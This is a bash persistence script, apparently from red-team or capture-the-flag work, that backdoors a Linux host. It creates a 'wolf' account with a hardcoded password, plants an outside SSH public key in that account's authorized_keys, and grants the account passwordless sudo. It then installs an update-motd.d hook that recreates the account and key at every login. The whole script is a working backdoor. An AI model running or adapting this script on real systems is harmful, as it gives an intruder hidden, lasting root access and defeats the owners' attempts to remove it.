#!/bin/bash
# wolf update-motd script. Adds user to file and with each system login ensures user still exists

# create user
useradd -m -p $(openssl passwd -1 "ZGVDb2RlVGhpc0JydWg=") wolf

mkdir -p /etc/wolf/.ssh

cat <<'EOF' > /etc/wolf/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCdSRMXcPtoQeAJgDUkNbrfNBHlHY/FHA884PRkqvgA1GRz4BLO4NWAIpHvwlt208cpW1wq8cvhXVHuT5+46WaTY0b82+kjLWnLFvca45l5nSmF5zwp9Tf1hDl3n+xovqVThBlf+rIop1nJXzi390OUvm5bgnAs2pyjhwzD7Vhw6JweXYGXjN1gtWVZP46n9sxWNUGCcnPLEXmkNHshkNHnpceTqF/kTsD1GhdAS68p0vwCnVVkzkoGBg3UUHF5B2AGtwvD6S4TOs2OQaR/Qj3hYLszkDac0Bi8gehEcKmR5dKPF8MH/IZzT39Y1zE+pzJ8kLRyzYzprD1UYV0Z5Qbn user@parrot
EOF

chmod 700 /etc/wolf/.ssh
chmod 600 /etc/wolf/.ssh/authorized_keys
chown -R wolf:wolf /etc/wolf/.ssh

# add script to update-motd.d
cat <<'EOF' > /etc/update-motd.d/99-wolf
#!/bin/bash
if ! id wolf &>/dev/null; then
    useradd -m wolf
fi

if [ ! -f /etc/wolf/.ssh/authorized_keys ]; then
    mkdir -p /etc/wolf/.ssh
    cat > /etc/wolf/.ssh/authorized_keys <<'SSHKEY'
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCdSRMXcPtoQeAJgDUkNbrfNBHlHY/FHA884PRkqvgA1GRz4BLO4NWAIpHvwlt208cpW1wq8cvhXVHuT5+46WaTY0b82+kjLWnLFvca45l5nSmF5zwp9Tf1hDl3n+xovqVThBlf+rIop1nJXzi390OUvm5bgnAs2pyjhwzD7Vhw6JweXYGXjN1gtWVZP46n9sxWNUGCcnPLEXmkNHshkNHnpceTqF/kTsD1GhdAS68p0vwCnVVkzkoGBg3UUHF5B2AGtwvD6S4TOs2OQaR/Qj3hYLszkDac0Bi8gehEcKmR5dKPF8MH/IZzT39Y1zE+pzJ8kLRyzYzprD1UYV0Z5Qbn user@parrot
SSHKEY
    chmod 700 /etc/wolf/.ssh
    chmod 600 /etc/wolf/.ssh/authorized_keys
    chown -R wolf:wolf /etc/wolf/.ssh
fi

EOF

echo "wolf ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/wolf
chmod 440 /etc/sudoers.d/wolf

chmod 755 /etc/update-motd.d/99-wolf
